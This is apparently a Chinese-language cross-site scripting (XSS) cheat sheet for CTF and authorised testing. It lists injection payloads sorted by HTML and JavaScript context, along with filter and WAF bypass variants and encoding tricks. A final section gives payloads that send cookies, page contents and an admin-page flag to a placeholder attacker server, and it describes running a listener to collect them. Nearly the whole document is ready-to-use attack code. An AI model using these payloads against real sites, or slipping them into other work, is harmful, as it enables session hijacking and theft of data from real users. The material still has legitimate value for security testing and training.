# XSS · Payload

> ⚠️ 仅用于**合法授权的安全测试**与 **CTF 赛题环境**。原理见 [原理笔记.md](原理笔记.md)。

## 基础验证（按上下文选）

| 上下文 | Payload |
| --- | --- |
| 标签之间 | `<script>alert(1)</script>` |
| 双引号属性内 | `"><script>alert(1)</script>` |
| 单引号属性内 | `'><script>alert(1)</script>` |
| 无引号属性内 | `onmouseover=alert(1) autofocus` |
| JS 字符串内 | `";alert(1);//` |
| JS 非字符串内 | `1;alert(1)` |
| `javascript:` 协议 | `javascript:alert(1)` |

## 无 script 标签的替代（过滤 `<script>` 时）

| 载体 | Payload |
| --- | --- |
| img 报错 | `<img src=x onerror=alert(1)>` |
| svg | `<svg onload=alert(1)>` |
| body | `<body onload=alert(1)>` |
| input | `<input autofocus onfocus=alert(1)>` |
| details | `<details open ontoggle=alert(1)>` |
| iframe | `<iframe src="javascript:alert(1)">` |
| iframe srcdoc | `<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">` |
| video/audio | `<video><source onerror=alert(1)>` |
| marquee | `<marquee onstart=alert(1)>` |
| a + 自动点击 | `<a href="javascript:alert(1)" id=x></a><script>document.all.x.click()</script>` |

## 无括号 / 无引号 / 无关键字（绕 WAF）

| 限制 | 绕过写法 |
| --- | --- |
| 过滤 `(` `)` | `` <script>alert`1`</script> ``、`<img src=x onerror=top.onerror=alert;throw 1>` |
| 过滤引号 | `<img src=x onerror=alert(1)>`（数字不用引号）、`<svg onload=alert(1)>` |
| 过滤 `alert` | `confirm(1)`、`prompt(1)`、`print()`、`top['ale'+'rt'](1)`、`window['\x61lert'](1)` |
| 过滤空格 | `<img/src=x/onerror=alert(1)>`、`<svg%0aonload=alert(1)>` |
| 过滤 `<script>` | 见上一节任意一个 |
| 过滤 `on*` 事件 | `<script>alert(1)</script>`、`<iframe srcdoc>`、`<svg><script>` |
| 长度限制 | `<svg/onload=eval(name)>` + 用 `window.name` 传代码；或 `eval(location.hash.slice(1))` |
| 过滤 `javascript` | `jav&#x09;ascript:alert(1)`、`java\0script:alert(1)` |

## 窃取数据 / 打后台（CTF 常用）

| 目的 | Payload |
| --- | --- |
| 外带 Cookie（无 HttpOnly） | `<script>new Image().src='//<你的服务器>/?c='+document.cookie</script>` |
| fetch 外带 | `<script>fetch('//<你的服务器>/?c='+btoa(document.cookie))</script>` |
| 外带页面内容（打后台） | `<script>fetch('//<你的服务器>/?h='+btoa(document.body.innerHTML))</script>` |
| 读 CSRF token 再提交 | `<script>fetch('/admin/flag').then(r=>r.text()).then(t=>location='//<你的服务器>/?f='+btoa(t))</script>` |
| 打管理员（BOT 访问） | 把上面任意一条提交到留言/反馈，等 BOT 触发 |
| 无外带通道时 | 让 BOT 去访问一个能记录访问的接口，或用盲打逐字符构造（慢但可行） |

> 外带服务器最小可用方案：`python -m http.server 8000`，然后看访问日志里的 query。

## 上下文探测模板

```html
<!-- 先探清楚落在哪里：提交这个，在源码里搜 xssmark -->
xssmark"><xssmark>
```

## 绕过编码的细节

| 场景 | 说明 |
| --- | --- |
| HTML 实体 | `&#x61;lert(1)`、`&lt;script&gt;` 在 HTML 上下文会被解码成真标签 |
| URL 编码 | 使用点如果在 `href` 里，`%0a` `%09` 常能穿过过滤 |
| Unicode | `\u0061lert(1)`（JS 上下文有效） |
| 双重编码 | 服务端解码一次、前端再解码一次时有用 |
| 大小写混写 | `<ScRiPt>alert(1)</sCrIpT>` |
| 标签内插注释 | `<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>` |

## 顺手验证的工具

| 工具 | 用途 |
| --- | --- |
| 浏览器 F12 → Elements | 确认 payload 实际落在哪个上下文（**比看响应源码更准**） |
| `document.cookie` 在 Console | 看会话 Cookie 是否 HttpOnly |
| Burp Repeater | 逐个变形试过滤规则 |
| XSS 平台（自建/比赛提供） | 打 BOT 时接收外带数据 |
